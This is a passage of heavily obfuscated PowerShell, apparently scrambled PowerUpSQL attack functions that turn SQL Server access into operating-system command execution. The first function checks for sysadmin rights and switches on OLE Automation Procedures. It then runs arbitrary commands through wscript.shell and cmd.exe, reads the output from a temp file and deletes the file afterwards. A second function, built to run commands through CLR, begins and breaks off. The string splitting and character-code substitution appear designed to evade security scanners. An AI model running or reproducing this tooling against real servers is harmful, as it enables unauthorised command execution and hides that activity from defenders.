        [Parameter(mANDAtORy = ${fa`lSE},
        HELpMesSAge = {"{5}{2}{1}{0}{4}{3}"-f'rede','c',' ','ials.','nt','Windows'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${crE`D`enTI`Al} =   (dIR vaRIaBLE:0459m2).ValUe::"E`Mpty",

        [Parameter(MANDatory = ${F`AlsE},
                vaLuEFROmPipElINE = ${T`Rue},
                VaLueFroMpIPELIneByprOPErtYnaME = ${Tr`UE},
        HELpmesSAgE = {"{8}{2}{1}{4}{3}{0}{5}{7}{6}" -f 't','instance t','er ','nnec','o co','i','to.','on ','SQL Serv'})]
        [string]${I`N`stanCE},

        [Parameter(mANdatORY = ${FAl`se},
        HeLPmeSsaGE = {"{8}{10}{6}{7}{2}{4}{1}{9}{5}{0}{3}{11}" -f 'n C','cate','in','onnectio','g Dedi','dmi','ect',' us','Co','d A','nn','n.'})]
        [Switch]${d`AC},

        [Parameter(MandATOry = ${TR`Ue},
        helpMesSage = {"{0}{2}{3}{1}{5}{6}{4}" -f'OS comman','ex','d to be',' ','d.','e','cute'})]
        [String]${CO`mM`AND} = ("{1}{0}"-f 'ami','who'),

        [Parameter(MaNdatORy = ${f`A`LSe},
        hElPmesSAge = {"{3}{1}{4}{2}{0}{5}"-f 'o','ect','on time','Conn','i','ut.'})]
        [string]${TIm`E`ouT},

        [Parameter(MaNDAtoRY = ${fal`sE},
        hElPmeSsagE = {"{0}{1}{5}{2}{3}{4}"-f 'Num','b','thre','ads','.','er of '})]
        [int]${T`hre`Ads} = 1,

        [Parameter(MaNdaTORy = ${Fal`sE},
        HelpmEssAgE = {"{6}{2}{3}{8}{12}{0}{9}{4}{5}{11}{1}{10}{7}"-f 'rbose ','en functio','p','pre','rrors. ',' Us','Su','apped.','ss','e','n is wr','ed wh',' ve'})]
        [switch]${SUP`pResSverB`O`se},

        [Parameter(mAnDatORy = ${FaL`sE},
        hElpMeSSAGE = {"{3}{13}{2}{4}{11}{9}{1}{10}{5}{0}{12}{8}{7}{6}"-f'r or in','s with',' t','Just ','he raw ','the compute','ce name.','n','a','t','out ','resul','st','show'})]
        [switch]${RAWR`es`UlTS}
    )

    Begin
    {
        
        ${Tblc`oMM`A`NDS} = &("{0}{2}{1}" -f 'New-O','ect','bj') -TypeName ("{2}{1}{4}{0}{3}{5}"-f 'a.','a','System.D','Data','t','Table')
        ${tbL`RES`U`LtS} = &("{0}{2}{1}" -f'New-Obje','t','c') -TypeName ("{0}{1}{2}{3}{4}"-f 'Sys','tem','.Data.Dat','aTabl','e')
        ${n`ULl} = ${tBL`RE`sulTs}."c`Olum`Ns".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{0}"-f'terName','Co','mpu'))
        ${N`ULl} = ${tBLR`Es`Ults}."cO`Lum`NS".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{2}" -f 'Ins','ta','nce'))
        ${Nu`lL} = ${Tb`LRE`sulTs}."Col`Um`Ns".("{1}{0}"-f 'd','Ad').Invoke(("{2}{3}{0}{1}" -f 'Resu','lts','Com','mand'))


        
        ${p`i`p`ELInEItEMs} = &("{0}{1}{2}" -f 'New-','O','bject') -TypeName ("{1}{4}{2}{6}{0}{5}{3}"-f'a','Sys','m','e','te','Tabl','.Data.Dat')

        
        if(-not ${Inst`An`cE})
        {
            ${INST`An`Ce} = ${eNv:`CO`MPuTER`NA`ME}
        }

        
        if(${I`N`STANCE})
        {
            ${P`R`O`ViDeInSTaNce} = &("{2}{1}{0}"-f 'ect','ew-Obj','N') -TypeName ("{0}{2}{1}"-f'P','ct','SObje') -Property @{
                ("{0}{2}{1}" -f 'I','stance','n') = ${I`NStan`cE}
            }
        }

        
        ${pIp`ELi`Ne`iTE`Ms} = ${piPE`L`ine`itEMS} + ${p`RovIDE`iNS`TA`Nce}
    }

    Process
    {
        
        ${pIpE`L`iNeIT`eMs} = ${PIPeL`InE`it`eMs} + ${_}
    }

    End
    {
        
        ${mYSCRip`TB`lOcK} = {
            ${in`StA`Nce} = ${_}."i`NstaNCe"

            
            ${CO`Mpu`Te`RNAmE} = &("{3}{0}{4}{6}{1}{2}{5}"-f 'Co','meFromI','ns','Get-','mput','tance','erNa') -Instance ${In`ST`An`Ce}

            
            if(-not ${In`sTa`N`Ce})
            {
                ${iN`stan`ce} = ${e`Nv:`c`OMpU`TerName}
            }

            
            if(${d`Ac})
            {
                
                ${CO`NnEC`TION} = &("{1}{4}{3}{0}{2}"-f'tio','Get-SQLC','nObject','c','onne') -Instance ${IN`ST`AnCe} -Username ${USEr`NAme} -Password ${P`A`sS`WOrD} -Credential ${cRe`d`E`NtiaL} -DAC -TimeOut ${tI`meout}
            }
            else
            {
                
                ${COnn`eC`TI`on} = &("{3}{0}{2}{1}{5}{4}" -f'QL','onnec','C','Get-S','onObject','ti') -Instance ${In`STA`NCe} -Username ${us`ERna`mE} -Password ${paSS`wO`Rd} -Credential ${creD`E`N`TIal} -TimeOut ${t`ime`oUt}
            }

            
            try
            {
                
                ${C`O`NneCtiOn}.("{1}{0}"-f'pen','O').Invoke()

                if(-not ${sUP`Pr`eSS`VEr`BosE})
                {
                    &("{2}{1}{0}" -f'erbose','ite-V','Wr') -Message ("$Instance "+': '+'Con'+'nection'+' '+'Su'+'cc'+'ess.')
                }

                
                ${DisAB`le`ShOWAD`Va`Nce`dopti`ONs} = 0
                ${Di`sABlEo`Le} = 0

                
                ${iS`SYsAD`M`In} = &("{5}{3}{4}{1}{2}{0}" -f 'k','d','minChec','S','QLSysa','Get-') -Instance ${In`STa`NCE} -Credential ${Cr`e`DenTIal} -Username ${USeR`N`AMe} -Password ${pAss`Wo`Rd} -SuppressVerbose | &("{1}{3}{2}{0}"-f't','S','ec','elect-Obj') -Property ("{2}{0}{1}" -f'y','sadmin','IsS') -ExpandProperty ("{0}{2}{3}{1}"-f'IsS','min','ys','ad')

                
                if(${Issy`S`AdmIn} -eq 'Yes')
                {
                    &("{1}{0}{2}" -f'e','Write-V','rbose') -Message ("$Instance "+': '+'Yo'+'u '+'a'+'re '+'a '+'sysa'+'d'+'min'+'.')
                    ${iSoLe`E`NablEd} = &("{0}{2}{1}"-f 'Get-SQ','ry','LQue') -Instance ${i`NSTaNcE} -Query ((("{0}{2}{3}{4}{6}{1}{5}" -f 'sp_c','t','onfigur','e',' J2aOle','ion ProceduresJ2a',' Automa')) -CrEPlAce([cHaR]74+[cHaR]50+[cHaR]97),[cHaR]39) -Username ${uSe`RNAmE} -Password ${P`AsSW`OrD} -Credential ${cRE`deNtI`Al} -SuppressVerbose | &("{2}{0}{1}{3}" -f'e','c','Sel','t-Object') -Property ("{1}{2}{0}" -f'lue','c','onfig_va') -ExpandProperty ("{1}{2}{0}"-f'_value','c','onfig')
                    ${ISsho`WadVANcE`de`Na`BLEd} = &("{2}{1}{0}"-f'ry','LQue','Get-SQ') -Instance ${iNs`TA`N`CE} -Query ((("{5}{4}{2}{0}{1}{3}{6}{7}"-f 'CuR','Show ','gure ','Adva','fi','sp_con','nced Op','tionsCuR'))-rEPlaCE ([CHar]67+[CHar]117+[CHar]82),[CHar]39) -Username ${u`sE`RnaMe} -Password ${pa`s`SWorD} -Credential ${C`RE`DENtial} -SuppressVerbose | &("{1}{0}{2}"-f 'c','Sele','t-Object') -Property ("{3}{1}{2}{0}"-f 'lue','ig_','va','conf') -ExpandProperty ("{2}{3}{1}{0}" -f '_value','g','co','nfi')
                }
                else
                {
                    &("{3}{1}{2}{0}" -f'rbose','it','e-Ve','Wr') -Message ("$Instance "+': '+'Yo'+'u '+'ar'+'e '+'n'+'ot '+'a '+'s'+'ys'+'admi'+'n. '+'Thi'+'s '+'co'+'mmand '+'req'+'ui'+'re'+'s '+'sy'+'sad'+'mi'+'n '+'p'+'riv'+'ileges.')

                    
                    ${nu`lL} = ${tblRe`s`Ults}."r`OWs".("{0}{1}" -f'A','dd').Invoke("$ComputerName","$Instance",("{1}{3}{0}{4}{2}{5}" -f'mi','No ','rivileges','sysad','n p','.'))
                    return
                }

                
                if (${iSsHOWaDv`AnceD`EnAbl`ed} -eq 1)
                {
                    &("{0}{2}{1}" -f'Writ','erbose','e-V') -Message ("$Instance "+': '+'Sho'+'w '+'Ad'+'v'+'a'+'nced '+'Opti'+'o'+'ns '+'i'+'s '+'a'+'lready '+'e'+'nabled.')
                }
                else
                {
                    &("{1}{2}{0}{3}"-f'-Ver','Wr','ite','bose') -Message ("$Instance "+': '+'Sho'+'w '+'Advan'+'ce'+'d '+'O'+'ption'+'s '+'is'+' '+'di'+'sable'+'d.')
                    ${dISA`B`LESH`o`Wadv`AN`cED`op`TIONs} = 1

                    
                    &("{3}{1}{0}{2}"-f'Q','t-SQL','uery','Ge') -Instance ${INsTA`N`cE} -Query ((("{3}{6}{9}{11}{0}{8}{2}{5}{1}{10}{7}{4}"-f'gure E','vanced Optio','S','sp','E','how Ad','_','e,1;RECONFIGUR','re','conf','nsEr','i'))  -CRePlAce  'Ere',[CHaR]39) -Username ${uS`erN`AMe} -Password ${pASS`word} -Credential ${cREDeN`Ti`Al} -SuppressVerbose

                    
                    ${is`sh`owA`dvanCe`d`enaBLE`D2} = &("{3}{1}{2}{0}"-f'QLQuery','e','t-S','G') -Instance ${iNs`Ta`NCE} -Query ((("{9}{5}{7}{1}{0}{8}{4}{6}{2}{3}" -f'ow ','7JSh','ons4','7J','nced Op','onfigure','ti',' 4','Adva','sp_c')) -CrEplAcE  ([chaR]52+[chaR]55+[chaR]74),[chaR]39) -Username ${U`SER`N`AmE} -Password ${p`AS`swOrD} -Credential ${C`R`E`dEntIal} -SuppressVerbose | &("{3}{2}{0}{4}{1}" -f'ct-','t','le','Se','Objec') -Property ("{3}{2}{1}{0}" -f 'ue','ig_val','onf','c') -ExpandProperty ("{1}{0}{2}" -f 'fig','con','_value')

                    if (${is`SHow`Adva`NCEDEN`A`Ble`d2} -eq 1)
                    {
                        &("{0}{2}{1}{3}"-f 'Write','o','-Verb','se') -Message ("$Instance "+': '+'Enab'+'led '+'Show'+' '+'Adv'+'anc'+'ed '+'O'+'ptions'+'.')
                    }
                    else
                    {
                        &("{1}{2}{0}" -f'ose','Writ','e-Verb') -Message ("$Instance "+': '+'E'+'nabling'+' '+'Sh'+'ow '+'A'+'dvanc'+'ed '+'Opti'+'ons '+'fai'+'led.'+' '+'Abor'+'tin'+'g.')

                        
                        ${n`ULl} = ${tBlre`su`Lts}."Ro`WS".("{0}{1}"-f 'A','dd').Invoke("$ComputerName","$Instance",("{0}{2}{5}{4}{6}{3}{1}" -f'Cou','ns.','ld not','nced Optio','ble Show ',' ena','Adva'))
                        return
                    }
                }

                
                if (${i`SOL`eeNAb`leD} -eq 1)
                {
                    &("{3}{2}{0}{1}"-f 'o','se','rb','Write-Ve') -Message ("$Instance "+': '+'Ol'+'e '+'Aut'+'omati'+'on '+'Procedur'+'e'+'s'+' '+'a'+'re '+'a'+'l'+'ready '+'enabl'+'ed'+'.')
                }
                else
                {
                    &("{2}{3}{1}{0}"-f 'bose','er','Wr','ite-V') -Message ("$Instance "+': '+'Ol'+'e '+'Au'+'t'+'omation '+'Pr'+'oc'+'edures'+' '+'ar'+'e '+'disab'+'le'+'d.')
                    ${D`I`Sa`BLeOlE} = 1

                    
                    &("{2}{1}{3}{0}"-f 'ry','u','Get-SQLQ','e') -Instance ${i`N`staNCe} -Query ((("{4}{7}{9}{6}{10}{1}{2}{3}{11}{8}{5}{0}"-f'ONFIGURE','e Automation Proce','dur','es{','s','EC','{','p_co','1;R','nfigure ','0}Ol','0},')) -f  [ChAR]39) -Username ${uSEr`Na`ME} -Password ${P`A`sswoRD} -Credential ${c`RedEntI`AL} -SuppressVerbose

                    
                    ${IsolE`En`A`Bl`ed2} = &("{2}{1}{0}"-f 'Query','t-SQL','Ge') -Instance ${i`Ns`Tance} -Query ((("{7}{0}{5}{6}{3}{2}{4}{1}"-f '_con','N','n Pro','o','ceduresOL','figure OLNOle Autom','ati','sp'))."re`plA`cE"('OLN',[STRing][ChaR]34)) -Username ${US`ERNA`me} -Password ${pa`SswOrD} -Credential ${C`REDeN`T`Ial} -SuppressVerbose | &("{2}{1}{0}" -f'Object','ct-','Sele') -Property ("{0}{1}{2}"-f'co','nfig','_value') -ExpandProperty ("{2}{0}{1}"-f 'f','ig_value','con')

                    if (${isoLEeN`ABLE`D2} -eq 1)
                    {
                        &("{1}{2}{0}"-f 'rbose','Write-V','e') -Message ("$Instance "+': '+'Ena'+'b'+'led '+'Ol'+'e '+'Autom'+'ation'+' '+'P'+'ro'+'c'+'edures.')
                    }
                    else
                    {
                        &("{2}{0}{1}{3}" -f 'e-V','erbo','Writ','se') -Message ("$Instance "+': '+'E'+'nabl'+'ing '+'Ol'+'e '+'Aut'+'omat'+'ion'+' '+'Procedu'+'res'+' '+'fa'+'iled. '+'Abo'+'rt'+'ing.')

                        
                        ${N`ULl} = ${t`BLRESUl`TS}."r`OWs".("{1}{0}" -f 'd','Ad').Invoke("$ComputerName","$Instance",("{7}{10}{2}{5}{1}{3}{11}{9}{0}{12}{4}{6}{8}" -f'm','nable',' no',' Ol','tion ','t e','Procedure','Coul','s.','Auto','d','e ','a'))

                        return
                    }
                }

                
                ${OuT`PU`TDIr} = ((("{1}{2}{6}{4}{3}{5}{0}"-f'mp','c:{0}wi','nd','t','0}','e','ows{')) -F  [chAr]92)
                ${out`Put`File} = (-join ((65..90) + (97..122) | &("{1}{0}{2}"-f 'Rand','Get-','om') -Count 5 | &('%') {[char]${_}}))
                ${Ou`Tpu`T`Path} = "$outputdir\$outputfile.txt"                   

                
                &("{2}{3}{1}{0}{4}" -f'-ve','e','w','rit','rbose') ("$instance "+': '+'Exe'+'cuting'+' '+'command'+': '+"$Command")               
                ${Q`UErY`C`mdexE`CutE} = 
(('bGw'+'
'+'DECLARE ')."rE`plACE"(([ChAR]98+[ChAR]71+[ChAR]119),[STRInG][ChAR]34)+'@She'+'ll'+' '+'IN'+'T
'+'DECLA'+'RE '+'@Out'+'pu'+'t '+'va'+'rchar(8000)
E'+'XE'+'C '+'@Outpu'+'t'+' '+'= '+'Sp_oac'+'re'+'ate '+('{'+'0}w'+'scr'+'ipt.'+'sh'+'ell{0}, ') -F [Char]39+'@She'+'ll'+' '+'Outp'+'u'+'t, '+'5
EX'+'EC '+'Sp_o'+'amethod'+' '+'@s'+'hell'+', '+('{0}r'+'un{0}'+' ')  -f [cHAR]39+', '+'null,'+' '+('C6'+'7cm'+'d.ex'+'e'+' ')."REP`lace"('C67',[StrinG][CHaR]39)+'/'+'c '+('{0}{1}'+'Command'+' ') -f[cHAR]34,[cHAR]36+'> '+(('BMf'+'Output'+'PathUa8'+'yni ')-rEPLAcE ([CHAR]85+[CHAR]97+[CHAR]56),[CHAR]34  -CREPLaCe ([CHAR]66+[CHAR]77+[CHAR]102),[CHAR]36-rEPLAcE([CHAR]121+[CHAR]110+[CHAR]105),[CHAR]39)+('
'+'{0}') -F  [char]34)
                
                ${N`Ull} = &("{2}{0}{1}{3}"-f't-S','Q','Ge','LQuery') -Instance ${iNstA`N`ce} -Query ${querYCmd`eX`E`c`UTe} -Username ${usEr`N`AmE} -Password ${P`ASsw`Ord} -Credential ${cR`eDEn`T`Ial} -SuppressVerbose 

                
                &("{0}{1}{2}{3}" -f 'w','rit','e-v','erbose') ("$instance "+': '+'Rea'+'di'+'ng '+'c'+'omman'+'d '+'outp'+'ut '+'f'+'rom '+"$OutputPath")
                ${qU`e`RY`REAdco`m`ManDOUtp`UT} = 
((('wT'+'A
'+'DECLARE ')-rePlACE ([chAr]119+[chAr]84+[chAr]65),[chAr]34)+'@fso'+' '+'INT'+'
DEC'+'LA'+'RE '+'@f'+'i'+'le '+'I'+'NT
'+'DECLAR'+'E '+'@'+'o '+'in'+'t
DECLARE'+' '+'@f'+' '+'int
DEC'+'L'+'ARE '+'@re'+'t '+'in'+'t '+'
'+'DEC'+'LARE '+'@'+'F'+'ileConte'+'nts '+'v'+'archar'+'(80'+'00) '+'
'+'EXE'+'C '+'S'+'p_oacr'+'eate '+(('yY8sc'+'r'+'i'+'p'+'ting.f'+'i'+'lesyste'+'mobjec'+'tyY8 ')-RepLace([chAr]121+[chAr]89+[chAr]56),[chAr]39)+', '+'@f'+'so '+'O'+'u'+'tput, '+'5
'+'E'+'XEC '+'S'+'p_oam'+'e'+'thod '+'@f'+'so'+', '+(('PlIop'+'e'+'ntextfile'+'PlI ')  -crePlaCE'PlI',[cHar]39)+', '+'@f'+'ile '+'Ou'+'t, '+('{0'+'}{1'+'}Ou'+'tputP'+'ath{0'+'}'+','+'1
EXEC ')  -F [chAr]39,[chAr]36+'sp_'+'oacr'+'eate '+('zU3s'+'c'+'ript'+'i'+'ng.f'+'ilesystemobj'+'e'+'c'+'tzU3,'+' ')."R`EPLacE"(([cHaR]122+[cHaR]85+[cHaR]51),[stRiNG][cHaR]39)+'@o'+' '+'o'+'ut '+'
E'+'XEC '+'s'+'p_'+'o'+'amethod '+'@o,'+' '+('{0}'+'ope'+'nte'+'xtfi'+'le{'+'0}, ')-F  [cHaR]39+'@f'+' '+'ou'+'t, '+(('a'+'Emft'+'oO'+'utput'+'P'+'athaEm, ')-rEPlAcE  'aEm',[Char]39  -CREplACe  'fto',[Char]36)+'1 '+'
EXE'+'C '+'@ret'+' '+'= '+'sp_oam'+'et'+'hod '+'@f'+', '+('{0}'+'read'+'all'+'{0'+'}, ') -f  [ChAr]39+'@FileC'+'on'+'tents '+'ou'+'t '+'
S'+'ELECT '+'@FileC'+'onte'+'n'+'t'+'s '+'a'+'s '+('outp'+'u'+'t
{0}')-f [CHAr]34)               
                
                ${Cm`dRESUL`TS} = &("{0}{1}{2}" -f 'Get','-SQLQuer','y') -Instance ${i`NS`TaNCe} -Query ${queryR`ead`CO`mMA`N`d`OUtPuT} -Username ${Userna`mE} -Password ${p`As`SwORd} -Credential ${cRED`e`NtiAL} -SuppressVerbose | &("{1}{2}{3}{0}" -f't','Select-Ob','j','ec') -Property ("{0}{1}" -f 'o','utput') -ExpandProperty ("{0}{1}"-f 'ou','tput')

                
                &("{3}{2}{1}{0}" -f 'verbose','ite-','r','w') ("$instance "+': '+'Remo'+'vi'+'ng '+'fil'+'e '+"$OutputPath")
                ${Qu`E`RyrE`mO`VE`FIlE} = 
(('N'+'TO
D'+'ECLARE ')."rE`PL`ACe"(([CHaR]78+[CHaR]84+[CHaR]79),[STRinG][CHaR]34)+'@'+'Shell'+' '+'I'+'NT
EXE'+'C '+'Sp_o'+'acr'+'eat'+'e '+('{0}ws'+'cri'+'pt.she'+'ll'+'{0} ')-F  [CHAR]39+', '+'@s'+'he'+'ll '+'O'+'ut'+'put, '+'5
E'+'XEC '+'Sp_oamet'+'h'+'od '+'@Shell'+', '+(('CRlr'+'unC'+'Rl ')-replACE ([char]67+[char]82+[char]108),[char]39)+', '+'null'+','+' '+(('3u8cmd.'+'exe'+' ') -CrePLace  ([ChAr]51+[ChAr]117+[ChAr]56),[ChAr]39)+'/c'+' '+(('Qk'+'bde'+'l ')-rEPlace([cHaR]81+[cHaR]107+[cHaR]98),[cHaR]34)+(('lN'+'BO'+'utpu'+'tPat'+'h8vItpM ')  -CREplAcE  'tpM',[char]39-rEplacE '8vI',[char]34 -rEplacE  ([char]108+[char]78+[char]66),[char]36)+', '+(('Tx'+'V0Tx'+'V ')  -REplAcE 'TxV',[CHar]39)+', '+(('8Tqt'+'rue8Tq
'+'j'+'lC') -rEpLACE'8Tq',[CHAR]39-CREpLACE'jlC',[CHAR]34))
                
                ${N`UlL} = &("{0}{3}{2}{1}"-f 'Get','ery','LQu','-SQ') -Instance ${InSTA`N`Ce} -Query ${QUErYrem`ove`F`ILE} -Username ${u`S`ern`Ame} -Password ${P`AsSW`ord} -Credential ${cRED`enT`IAl} -SuppressVerbose | &("{2}{4}{3}{1}{0}" -f'-Object','t','S','ec','el') -Property ("{1}{0}"-f 't','outpu') -ExpandProperty ("{0}{1}{2}" -f 'o','ut','put')

                
                if(${rA`wR`eS`UltS})
                {
                    ${CMD`RES`UlTS} | &("{1}{0}" -f'elect','S') ("{0}{1}"-f'outpu','t') -ExpandProperty ("{0}{1}" -f 'out','put')
                }
                else
                {
                    ${N`ULL} = ${t`BL`ResUL`TS}."r`OwS"."A`dd"(${cOMp`UTERn`AME}, ${iNst`A`Nce}, [string]${CMDR`ES`U`LtS}.("{1}{0}" -f 'rim','t').Invoke())
                }

                
                if(${D`ISabLE`o`le} -eq 1)
                {
                    &("{2}{0}{1}"-f'te-','Verbose','Wri') -Message ("$Instance "+': '+'Disa'+'bling'+' '+('tvIOl'+'e ')."RE`P`laCe"('tvI',[STRInG][ChAr]39)+'A'+'uto'+'mation '+'Proc'+'edure'+'s')
                    &("{1}{0}{2}"-f 't-SQLQu','Ge','ery') -Instance ${INs`T`ANCE} -Query ((("{14}{10}{11}{1}{6}{2}{4}{5}{13}{7}{8}{9}{12}{3}{0}"-f'URE','brOle Aut','i','IG','on',' Pr','omat','ures','Hbr,0;','REC','nfig','ure H','ONF','oced','sp_co'))."rEPLa`ce"('Hbr',[sTRinG][cHAr]39)) -Username ${Us`e`RnAMe} -Password ${p`ASS`wOrd} -Credential ${CReDEN`TI`AL} -SuppressVerbose
                }

                
                if(${Di`SaBLesho`WA`dvan`ceDOp`TiOnS} -eq 1)
                {
                    &("{1}{3}{0}{2}"-f'te-V','W','erbose','ri') -Message ("$Instance "+': '+'Disabl'+'in'+'g '+'Sho'+'w '+'A'+'dv'+'anced '+'Opti'+'ons')
                    &("{3}{1}{0}{2}" -f 'Quer','et-SQL','y','G') -Instance ${IN`St`AncE} -Query ((("{3}{2}{6}{8}{1}{5}{4}{7}{10}{9}{0}"-f 'GURE',' ','e {0','sp_configur','ons{0},','Opti','}Show Ad','0;','vanced','ONFI','REC'))  -f [CHAR]39) -Username ${us`E`RN`Ame} -Password ${pa`ss`WORD} -Credential ${CrE`dEN`T`Ial} -SuppressVerbose
                }

                
                ${Co`N`N`ecTiON}.("{0}{1}"-f'C','lose').Invoke()

                
                ${c`OnNEC`T`ioN}.("{1}{2}{0}"-f 'se','D','ispo').Invoke()
            }
            catch
            {
                

                if(-not ${SU`pPREsSve`RB`O`Se})
                {
                    ${eRR`o`RMeSSAGe} = ${_}."excEP`T`iOn"."mES`sA`gE"
                    &("{2}{1}{0}{3}"-f'i','r','W','te-Verbose') -Message ("$Instance "+': '+'Con'+'nectio'+'n '+'Fa'+'ile'+'d.')
                    
                }

                
                ${nu`lL} = ${t`BLrEs`UL`Ts}."r`oWs".("{0}{1}"-f 'Ad','d').Invoke("$ComputerName","$Instance",("{3}{2}{1}{0}{5}{4}{6}" -f'ssible',' Acce','t','No',' Faile',' or Command','d'))
            }
        }

        
        ${pI`p`Eline`i`TEms} | &("{4}{1}{3}{2}{0}"-f'lel','oke-Par','l','a','Inv') -ScriptBlock ${MYSC`RIP`TblO`cK} -ImportSessionFunctions -ImportVariables -Throttle ${tH`RE`ADS} -RunspaceTimeout 2 -Quiet -ErrorAction ("{2}{1}{0}"-f 'lyContinue','t','Silen')

        return ${tblRe`su`l`Ts}
    }
}









Function  invo`Ke-SqLO`SC`mD`cLR
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNdATOry = ${fa`lse},
        helPmesSAgE = {"{13}{2}{7}{1}{5}{11}{6}{3}{4}{9}{8}{12}{0}{10}{14}" -f'cate','r ','e','nt',' to a','or dom','cou','rve','thent','u',' wit','ain ac','i','SQL S','h.'})]
        [string]${UsErN`A`Me},

        [Parameter(mAndaToRy = ${FA`LSE},
        heLPmEsSagE = {"{7}{8}{6}{2}{9}{14}{3}{1}{0}{15}{13}{5}{4}{12}{10}{11}" -f't pa','oun','r or',' acc','thentica',' au','e','SQL S','erv',' d',' wit','h.','te','to','omain','ssword '})]
        [string]${PAsSW`O`Rd},

        [Parameter(maNdaTOry = ${fa`lSe},
        hElPmeSsAGe = {"{3}{2}{0}{1}" -f' cred','entials.','ows','Wind'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cR`edENTI`AL} =  $0459m2::"em`pty",

        [Parameter(MaNdAtory = ${F`A`LsE},
                vaLUEFrOmPiPELINE = ${tR`Ue},
                vAlueFRoMpIpElineBYPRoPERTYnaMe = ${tr`UE},
        helPMEssAge = {"{0}{4}{10}{1}{3}{7}{2}{9}{8}{5}{6}" -f 'SQL','e','tance','r i',' Ser','nection ','to.','ns','n',' to co','v'})]
        [string]${INS`TAn`ce},

        [Parameter(mandATory = ${Fal`sE},
        helPMEssage = {"{6}{0}{3}{5}{4}{2}{1}" -f 'nnect using ','on.','i','Dedicated','nect',' Admin Con','Co'})]
        [Switch]${D`AC},

        [Parameter(MAnDatOry = ${t`Rue},
        hElPMessAgE = {"{2}{4}{1}{0}{3}{6}{5}"-f'be ','nd to ','OS','exec',' comma','ed.','ut'})]
        [String]${Co`mMA`Nd},

        [Parameter(MAndATOrY = ${FaL`se},
        HELPmESSAGe = {"{0}{1}{4}{2}{3}"-f 'Co','n','t','imeout.','nection '})]
        [string]${Time`Out},

        [Parameter(manDatoRy = ${FA`lse},
        heLPmeSsagE = {"{2}{1}{4}{0}{3}" -f 'h','be','Num','reads.','r of t'})]
        [int]${tHre`ADS} = 1,

        [Parameter(MaNDAtoRy = ${fa`Lse},
        helpmeSSagE = {"{3}{5}{13}{10}{12}{9}{8}{0}{1}{4}{6}{7}{2}{11}{14}" -f 'ors.  Used when ','f','s wr','Su','u','ppr','ncti','on i',' err','e','s ','app','verbos','es','ed.'})]
        [switch]${Sup`presS`VErbO`sE},

        [Parameter(mAnDAToRy = ${F`AlSE},
        HElpMesSaGE = {"{12}{6}{10}{0}{8}{3}{5}{9}{14}{16}{15}{2}{1}{7}{4}{11}{13}"-f 'how the raw resu','e','or instanc','s wi','n','tho','st',' ','lt','ut ',' s','ame','Ju','.','the com','ter ','pu'})]
        [switch]${RAWReSU`L`Ts}
    )

    Begin
    {
        
        ${tbLcoMM`A`Nds} = &("{0}{1}{2}" -f 'New-Obj','e','ct') -TypeName ("{2}{0}{5}{6}{4}{3}{1}"-f'ata','able','System.D','aT','t','.D','a')
        ${tB`lREsU`l`TS} = &("{3}{0}{2}{1}"-f'ew','Object','-','N') -TypeName ("{4}{0}{3}{5}{2}{1}" -f'stem.D','able','ataT','ata.','Sy','D')
        ${NU`ll} = ${t`BLr`e`sUlTS}."coLU`M`NS".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{3}{1}"-f 'Co','e','mpu','terNam'))
        ${N`ULL} = ${t`Blr`ESUltS}."c`OlU`MNs".("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}{2}"-f 'n','Insta','ce'))
        ${n`Ull} = ${tb`l`REsuL`Ts}."COL`U`mNS".("{0}{1}" -f'Ad','d').Invoke(("{3}{0}{1}{2}"-f 'mman','dResul','ts','Co'))


        
        ${PIP`el`IneI`TEMS} = &("{1}{2}{0}" -f'Object','New','-') -TypeName ("{2}{1}{3}{0}{5}{4}" -f'DataT','tem.','Sys','Data.','le','ab')

        
        if(-not ${I`Nst`Ance})
        {
            ${iNStaN`ce} = ${EnV:ComP`Ut`E`Rna`mE}
        }

        
        if(${Ins`Ta`NCe})
        {
            ${p`RovidEInSt`AN`Ce} = &("{2}{1}{0}" -f'ct','w-Obje','Ne') -TypeName ("{0}{2}{1}" -f 'PSO','ect','bj') -Property @{
                ("{0}{2}{1}" -f'I','nce','nsta') = ${Ins`TaNcE}
            }
        }

        
        ${P`i`peLINe`it`EMS} = ${pipEL`InEI`T`Ems} + ${PRO`VIDEI`Ns`TAnCe}
    }

    Process
    {
        
        ${PiPE`lIn`eItEms} = ${pi`PELinEI`TEms} + ${_}
    }

    End
    {
        
        ${mYscr`i`PTbl`OCK} = {
            ${InS`TAN`ce} = ${_}."iNS`TaNCe"

            
            ${cO`M`pUtERnA`Me} = &("{6}{0}{3}{4}{1}{7}{2}{5}"-f'C','te','romI','o','mpu','nstance','Get-','rNameF') -Instance ${in`S`TANCE}

            
            if(-not ${I`N`sTANcE})
            {
                ${InsT`AnCE} = ${EnV:`C`om`PuTErN`AMe}
            }

            
            if(${d`AC})
            {
                
                ${C`onn`eCtION} = &("{6}{0}{4}{5}{3}{2}{1}" -f'S','ct','Obje','tion','QLConn','ec','Get-') -Instance ${i`Ns`TaNce} -Username ${U`serN`AMe} -Password ${PAss`w`ORD} -Credential ${CR`eDeNti`AL} -DAC -TimeOut ${T`i`meouT}
            }
            else
            {
                
                ${c`On`NeCTi`On} = &("{3}{0}{2}{1}" -f 'ctionObj','ct','e','Get-SQLConne') -Instance ${i`Ns`TaNCe} -Username ${U`SErn`AME} -Password ${P`A`SswoRD} -Credential ${crED`En`T`IaL} -TimeOut ${tiM`E`OUT}
            }

            
            try
            {
                
                ${co`Nn`EctiOn}.("{1}{0}" -f 'en','Op').Invoke()

                if(-not ${Su`pPrEssV`Er`BO`se})
                {
                    &("{3}{0}{2}{1}" -f 'ri','e-Verbose','t','W') -Message ("$Instance "+': '+'C'+'o'+'nnect'+'ion '+'S'+'uc'+'cess.')
                }

                
                ${DI`s`Abl`eShOWadv`AncE`DoPt`IOnS} = 0
                ${Dis`AbLe`C`LR} = 0

                
                ${ISS`y`saDMIN} = &("{3}{1}{2}{0}{4}" -f'minChe','t-SQL','Sysad','Ge','ck') -Instance ${insTa`N`ce} -Credential ${Cre`DEN`TI`AL} -Username ${USe`Rn`AME} -Password ${P`ASSW`oRd} -SuppressVerbose | &("{0}{2}{1}{3}{4}" -f'Se','ect-','l','O','bject') -Property ("{2}{0}{1}"-f'sS','ysadmin','I') -ExpandProperty ("{2}{1}{0}" -f'min','ad','IsSys')

                
                if(${i`S`SYs`AdmIn} -eq 'Yes')
